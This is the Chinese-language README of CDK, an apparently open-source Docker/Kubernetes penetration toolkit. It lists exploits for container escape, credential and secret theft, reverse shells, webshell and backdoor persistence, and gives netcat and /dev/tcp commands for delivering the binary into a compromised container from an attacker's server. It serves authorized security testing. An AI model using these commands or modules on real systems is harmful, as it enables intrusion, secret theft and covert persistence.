# CDK - Zero Dependency Docker/K8s Penetration Toolkit

简体中文 ｜ [English](https://github.com/Xyntax/CDK/wiki)

![png](https://static.cdxy.me/20201203170308_NwzGiT_Screenshot.jpeg)

## 免责声明

未经授权许可使用CDK攻击目标是非法的。
本程序应仅用于安全测试与研究目的。


## 介绍

CDK是一款为容器环境定制的渗透测试工具，在已攻陷的容器内部提供零依赖的常用命令及PoC/EXP。集成Docker/K8s场景特有的 逃逸、横向移动、持久化利用方式，插件化管理。

## 下载/植入
将可执行文件投递到已攻入的容器内部开始使用

https://github.com/cdk-team/CDK/releases/

#### 技巧：在真实渗透中如何通过漏洞exploit向容器中投递CDK

如果你的漏洞利用过程允许上传文件，即可直接植入CDK。  
如果你可以在目标容器中执行命令(RCE)，但容器中没有`wget`或`curl`命令，可以参考下面方法植入：  
  
1. 将CDK下载到你的公网服务器，监听端口：
```
nc -lvp 999 < cdk
```
2. 在已攻入的目标容器中执行：
```
cat < /dev/tcp/(你的IP)/(端口) > cdk
chmod a+x cdk
```

## 使用方法
```
Container DucK
Zero-dependency docker/k8s penetration toolkit by <i@cdxy.me>
Find tutorial, configuration and use-case in https://github.com/Xyntax/CDK/wiki

Usage:
  cdk evaluate [--full]
  cdk run (--list | <exploit> [<args>...])
  cdk <tool> [<args>...]

Evaluate:
  cdk evaluate                              Gather information to find weekness inside container.
  cdk evaluate --full                       Enable file scan during information gathering.

Exploit:
  cdk run --list                            List all available exploits.
  cdk run <exploit> [<args>...]             Run single exploit, docs in https://github.com/Xyntax/CDK/wiki

Tool:
  vi <file>                                 Edit files in container like "vi" command.
  ps                                        Show process information like "ps -ef" command.
  nc [options]                              Create TCP tunnel.
  ifconfig                                  Show network information.
  kcurl	(get|post) <url> <data>             Make request to K8s api-server.
  ucurl (get|post) <socket> <uri> <data>    Make request to docker unix socket.
  probe <ip> <port> <parallel> <timeout-ms> TCP port scan, example: cdk probe 10.0.1.0-255 80,8080-9443 50 1000

Options:
  -h --help     Show this help msg.
  -v --version  Show version.
```

## 功能

CDK包括三个功能模块

1. Evaluate: 容器内部信息收集，以发现潜在的弱点便于后续利用。
2. Exploit: 提供容器逃逸、持久化、横向移动等利用方式。
3. Tool: 修复渗透过程中常用的linux命令以及与Docker/K8s API交互的命令。

### Evaluate 模块

Usage 
```
cdk evaluate [--full]
```
用于本地信息收集，寻找可用的逃逸点，使用 `--full` 参数时会包含本地文件扫描。

检测项

|类别|检测点|已支持|详细文档|
|---|---|---|---|
|本地信息收集|OS基本信息|✔|[link](https://github.com/Xyntax/CDK/wiki/Evaluate:-System-Info)|
|本地信息收集|可用的Capabilities|✔|[link](https://github.com/Xyntax/CDK/wiki/Evaluate:-Commands-and-Capabilities)|
|本地信息收集|可用的Linux命令|✔|[link](https://github.com/Xyntax/CDK/wiki/Evaluate:-Commands-and-Capabilities)|
|本地信息收集|挂载情况|✔|[link](https://github.com/Xyntax/CDK/wiki/Evaluate:-Mounts)|
|本地信息收集|网络namespace隔离情况|✔|[link](https://github.com/Xyntax/CDK/wiki/Evaluate:-Net-Namespace)|
|本地信息收集|环境变量|✔|[link](https://github.com/Xyntax/CDK/wiki/Evaluate:-Services)|
|本地信息收集|敏感服务|✔|[link](https://github.com/Xyntax/CDK/wiki/Evaluate:-Services)|
|本地信息收集|敏感目录及文件|✔|[link](https://github.com/Xyntax/CDK/wiki/Evaluate:-Sensitive-Files)|
|本地信息收集|kube-proxy边界绕过(CVE-2020-8558)|✔|[link](https://github.com/cdk-team/CDK/wiki/Evaluate:-check-net.ipv4.conf.all.route_localnet)|
|网络探测|K8s Api-server信息|✔|[link](https://github.com/Xyntax/CDK/wiki/Evaluate:-K8s-API-Server)|
|网络探测|K8s Service-account信息|✔|[link](https://github.com/Xyntax/CDK/wiki/Evaluate:-K8s-Service-Account)|
|网络探测|云厂商Metadata API|✔|[link](https://github.com/Xyntax/CDK/wiki/Evaluate:-Cloud-Provider-Metadata-API)|

### Exploit 模块

列举全部exp
```
cdk run --list
```

执行指定的exp
```
cdk run <script-name> [options]
```

列表

|类别|功能|调用名|已支持|文档|
|---|---|---|---|---|
|容器逃逸|docker-runc CVE-2019-5736|runc-pwn|✔||
|容器逃逸|containerd-shim CVE-2020-15257|shim-pwn|✔|[link](https://github.com/Xyntax/CDK/wiki/Exploit:-shim-pwn)|
|容器逃逸|docker.sock逃逸PoC(docker-in-docker)|docker-sock-check|✔|[link](https://github.com/Xyntax/CDK/wiki/Exploit:-docker-sock-check)|
|容器逃逸|docker.sock命令执行|docker-sock-pwn|✔|[link](https://github.com/Xyntax/CDK/wiki/Exploit:-docker-sock-pwn)|
|容器逃逸|Docker API(2375)命令执行|docker-api-pwn|✔|[link](https://github.com/Xyntax/CDK/wiki/Exploit:-docker-api-pwn)|
|容器逃逸|挂载逃逸(特权容器)|mount-disk|✔|[link](https://github.com/Xyntax/CDK/wiki/Exploit:-mount-disk)|
|容器逃逸|Cgroup逃逸(特权容器)|mount-cgroup|✔|[link](https://github.com/Xyntax/CDK/wiki/Exploit:-mount-cgroup)|
|容器逃逸|Procfs目录挂载逃逸|mount-procfs|✔|[link](https://github.com/Xyntax/CDK/wiki/Exploit:-mount-procfs)|
|容器逃逸|Ptrace逃逸PoC|check-ptrace|✔|[link](https://github.com/Xyntax/CDK/wiki/Exploit:-check-ptrace)|
|容器逃逸|lxcfs cgroup错误配置逃逸|lxcfs-rw|✔|[link](https://github.com/cdk-team/CDK/wiki/Exploit:-lxcfs-rw)|
|容器逃逸|重写Cgroup以访问设备|rewrite-cgroup-devices|✔|[link](https://github.com/cdk-team/CDK/wiki/Exploit:-rewrite-cgroup-devices)|
|网络探测|K8s组件探测|service-probe|✔|[link](https://github.com/Xyntax/CDK/wiki/Exploit:-service-probe)|
|信息收集|检查和获取Istio元信息|istio-check|✔|[link](https://github.com/cdk-team/CDK/wiki/Exploit:-check-istio)|
|远程控制|反弹shell|reverse-shell|✔|[link](https://github.com/Xyntax/CDK/wiki/Exploit:-reverse-shell)|
|信息窃取|扫描AK及API认证凭据|ak-leakage|✔|[link](https://github.com/Xyntax/CDK/wiki/Exploit:-ak-leakage)|
|信息窃取|窃取K8s Secrets|k8s-secret-dump|✔|[link](https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-secret-dump)|
|信息窃取|窃取K8s Config|k8s-configmap-dump|✔|[link](https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-configmap-dump)|
|信息窃取|获取K8s Pod Security Policies|k8s-psp-dump|✔|[link](https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-psp-dump)|
|权限提升|K8s RBAC绕过|k8s-get-sa-token|✔|[link](https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-get-sa-token)|
|持久化|部署WebShell|webshell-deploy|✔|[link](https://github.com/cdk-team/CDK/wiki/Exploit:-webshell-deploy)|
|持久化|部署后门Pod|k8s-backdoor-daemonset|✔|[link](https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-backdoor-daemonset)|
|持久化|部署影子K8s api-server|k8s-shadow-apiserver|✔|[link](https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-shadow-apiserver)|
|持久化|K8s MITM攻击(CVE-2020-8554)|k8s-mitm-clusterip|✔|[link](https://github.com/cdk-team/CDK/wiki/Evaluate:-k8s-mitm-clusterip)|
|持久化|部署K8s CronJob|k8s-cronjob|✔|[link](https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-cronjob)|

### Tool 模块

还原部分常用的Linux命令，解决容器环境缩减的问题。参数略有不同，详见下面文档链接：

```
cdk nc [options]
cdk ps
```

列表

|子命令|描述|已支持|详细文档|
|---|---|---|---|
|nc|TCP隧道|✔|[link](https://github.com/Xyntax/CDK/wiki/Tool:-nc)|
|ps|获取进程信息|✔|[link](https://github.com/Xyntax/CDK/wiki/Tool:-ps)|
|ifconfig|获取网络信息|✔|[link](https://github.com/Xyntax/CDK/wiki/Tool:-ifconfig)|
|vi|文本编辑|✔|[link](https://github.com/Xyntax/CDK/wiki/Tool:-vi)|
|kcurl|发包到K8s api-server|✔|[link](https://github.com/Xyntax/CDK/wiki/Tool:-kcurl)|
|dcurl|发包到Docker HTTP API|✔|[link](https://github.com/cdk-team/CDK/wiki/Tool:-dcurl)|
|ucurl|发包到Docker Unix Socket|✔|[link](https://github.com/Xyntax/CDK/wiki/Tool:-ucurl)|
|rcurl|发包到Docker Registry API|||
|probe|IP/端口扫描|✔|[link](https://github.com/Xyntax/CDK/wiki/Tool:-probe)|
|kproxy|kubectl代理转发|||

## 反馈及贡献代码

首先感谢您花费时间来使CDK变得更好用👍

Bug反馈、建议以及代码提交，您的Github ID会在以下致谢列表披露：

* https://github.com/cdk-team/CDK/blob/main/thanks.md

#### Bug反馈

请提交在[GitHub Issues](https://github.com/cdk-team/CDK/issues)中，提供当前的CDK版本、报错信息或截图、能够复现这个问题的环境并详细描述您的复现步骤。

#### 功能建议

在[GitHub Discussions](https://github.com/cdk-team/CDK/discussions)中您可以畅所欲言，同开发人员讨论您想要的功能。

#### 代码提交

请通过[PR](https://github.com/cdk-team/CDK/pulls)提交您的代码，并包含如下信息：

修复Bug或增强代码健壮性：

* 提供当前的CDK版本、报错信息或截图、能够复现这个问题的环境并详细描述您的复现步骤。
* 请提供Bug修复前以及修复后的截图或日志对比。

增加功能或新的evaluate/exploit插件：

* 描述其应用场景，解决的问题。
* 请描述如何构建一个漏洞环境供我们评估代码与集成测试。
* 新功能使用时的截图或日志。
* 如果您在提交一个evaluate/exploit插件，请在PR的信息中加入使用文档，[文档示例](https://github.com/cdk-team/CDK/wiki/Exploit:-docker-sock-deploy)

## 收录于404StarLink 2.0 - Galaxy
![png](https://github.com/knownsec/404StarLink-Project/raw/master/logo.png)

CDK 是 404Team [星链计划2.0](https://github.com/knownsec/404StarLink2.0-Galaxy)中的一环，如果对CDK有任何疑问又或是想要找小伙伴交流，可以参考星链计划的加群方式。

- [https://github.com/knownsec/404StarLink2.0-Galaxy#community](https://github.com/knownsec/404StarLink2.0-Galaxy#community)